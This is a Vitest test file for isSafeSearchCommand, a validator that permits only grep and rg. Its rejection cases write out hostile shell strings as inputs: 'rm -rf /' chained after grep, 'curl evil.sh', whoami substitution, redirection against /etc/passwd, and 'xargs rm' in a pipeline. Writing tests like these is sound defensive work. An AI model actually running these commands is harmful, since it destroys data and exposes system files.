import { describe, expect, it } from "vitest";

import { isSafeSearchCommand } from "./commandSafety";

describe("isSafeSearchCommand", () => {
  it("allows a plain grep", () => {
    expect(isSafeSearchCommand("grep -rn '@shareable' services/")).toEqual({
      safe: true,
    });
  });

  it("allows rg", () => {
    expect(isSafeSearchCommand("rg --count-matches foo libs/")).toEqual({
      safe: true,
    });
  });

  it("allows a grep-to-grep pipeline", () => {
    expect(isSafeSearchCommand("grep -rn 'x' services/ | grep enum")).toEqual({
      safe: true,
    });
  });

  it.each([
    ["chaining with ;", "grep -rn 'x' . ; rm -rf /"],
    ["chaining with &&", "grep -rn 'x' . && curl evil.sh"],
    ["chaining with ||", "grep -rn 'x' . || echo pwned"],
    ["command substitution", 'grep -rn "$(whoami)" .'],
    ["redirection out", "grep -rn 'x' . > /etc/passwd"],
    ["redirection in", "grep -rn pattern < /etc/passwd"],
  ])("rejects %s", (_label, command) => {
    const verdict = isSafeSearchCommand(command);
    expect(verdict.safe).toBe(false);
  });

  it("rejects a backtick", () => {
    const verdict = isSafeSearchCommand("grep -rn `whoami` .");
    expect(verdict.safe).toBe(false);
  });

  it("rejects a non-allowlisted binary even without metacharacters", () => {
    const verdict = isSafeSearchCommand("cat /etc/passwd");
    expect(verdict).toEqual({
      safe: false,
      reason: "segment 'cat /etc/passwd' does not begin with grep or rg",
    });
  });

  it("rejects a dangerous binary hidden in a later pipeline segment", () => {
    const verdict = isSafeSearchCommand("grep -rn 'x' . | xargs rm");
    expect(verdict.safe).toBe(false);
  });

  it("rejects a binary whose name merely starts with grep", () => {
    const verdict = isSafeSearchCommand("grepevil -rn x .");
    expect(verdict.safe).toBe(false);
  });

  it("rejects an empty command", () => {
    expect(isSafeSearchCommand("   ")).toEqual({
      safe: false,
      reason: "command is empty",
    });
  });
});
